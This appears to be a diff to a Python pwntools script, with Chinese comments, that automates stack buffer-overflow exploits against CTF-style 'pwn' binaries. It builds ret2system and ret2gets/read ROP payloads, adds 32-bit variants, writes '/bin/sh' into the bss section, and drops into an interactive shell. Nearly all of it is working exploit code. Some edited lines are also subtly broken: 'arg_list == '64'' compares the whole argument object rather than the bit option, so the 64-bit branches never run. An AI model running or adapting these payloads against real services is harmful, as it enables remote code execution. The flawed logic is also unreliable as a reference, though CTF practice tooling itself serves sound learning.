@@ -16,7 +16,7 @@ parser.add_argument('-t', type=str, help='本地 or 远程地址')
 parser.add_argument('-p', type=int, help='端口号')
 parser.add_argument('-b', type=str, help='bit位')
 parser.add_argument('-m', type=str,
-                    help='模式 \n backdoor\t有直接可用的后门函数 \n no_write\t有/bin/sh和system但是不连接\nwrite\n有system，/bin/sh需要写入')
+                    help='模式 \n backdoor\t有直接可用的后门函数 \n nowrite\t有/bin/sh和system但是不连接\nwrite\n有system，/bin/sh需要写入')
 parser.add_argument('-f', type=str, help='写入 /bin/sh 的函数')
 arg_list = parser.parse_args()
 
@@ -30,6 +30,7 @@ gets = None
 pop_rsi = None
 pop_rdx = None
 bss = None
+to_binsh_flag = 0
 
 if arg_list.t == 'local':
     io = process("./pwn")
@@ -64,30 +65,45 @@ if arg_list.m == 'backdoor':
     payload = flat([cyclic(buf_length + ebp_len), backdoor]) if ret == 0 else flat(
         [cyclic(buf_length + ebp_len), ret, backdoor])
 elif arg_list.m == 'nowrite':
-    system = get_value('system') if system is None else system
+    system = elf.sym['system']
     bin_sh = get_value('bin_sh') if bin_sh is None else bin_sh
-    pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
-
-    payload = flat([cyclic(buf_length + ebp_len), pop_rdi, bin_sh, system]) if ret == 0 else flat(
-        [cyclic(buf_length + ebp_len), ret, pop_rdi, bin_sh, system]
-    )
+    if arg_list.b == '64':
+        pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
+        payload = flat([cyclic(buf_length + ebp_len), pop_rdi, bin_sh, system]) if ret == 0 else flat(
+            [cyclic(buf_length + ebp_len), ret, pop_rdi, bin_sh, system]
+        )
+    else:
+        payload = flat([cyclic(buf_length + ebp_len), system, 0, bin_sh])
 elif arg_list.m == 'write':
     # 有 system, /bin/sh 需要写入
     # 需要 bss 段
     # gets or read 地址
     # gets 需要一个参数 ,read 需要3个
+    to_binsh_flag = 1
     if arg_list.f == 'gets':
-        pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
         bss = get_value('bss') if bss is None else bss
-        gets = get_value('gets') if gets is None else gets
-        system = get_value('system') if system is None else system
-        payload = flat([cyclic(buf_length + ebp_len), pop_rdi, bss, gets, pop_rdi, bss, system]) if ret == 0 else flat(
-            [cyclic(buf_length + ebp_len), ret, pop_rdi, bss, gets, pop_rdi, bss, system]
-        )
+        gets = elf.sym['gets']
+        system = elf.sym['system']
+        if arg_list == '64':
+            pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
+            payload = flat(
+                [cyclic(buf_length + ebp_len), pop_rdi, bss, gets, pop_rdi, bss, system]) if ret == 0 else flat(
+                [cyclic(buf_length + ebp_len), ret, pop_rdi, bss, gets, pop_rdi, bss, system]
+            )
+        else:
+            payload = flat([cyclic(buf_length + ebp_len), gets, system, bss, bss])
+
     elif arg_list.f == 'read':
-        pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
-        log.error("这种情况寄存器结构有点乱，自己写下这里的代码吧")
-        exit()
+        bss = get_value('bss') if bss is None else bss
+        read = elf.sym['read']
+        system = elf.sym['system']
+        if arg_list == '64':
+            pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
+            log.error("这种情况寄存器结构有点乱，自己写下这里的代码吧")
+            exit()
+        else:
+            payload = cyclic(0x12 + 4) + p32(read) + p32(system) + p32(0) + p32(bss) + p32(0x10) + p32(bss)
+
     else:
         log.error("暂时没这个函数，要不改下代码？")
         exit()
@@ -96,4 +112,6 @@ else:
     exit()
 
 io.sendline(payload)
+if to_binsh_flag == 1:
+    io.sendline(b"/bin/sh\x00")
 io.interactive()
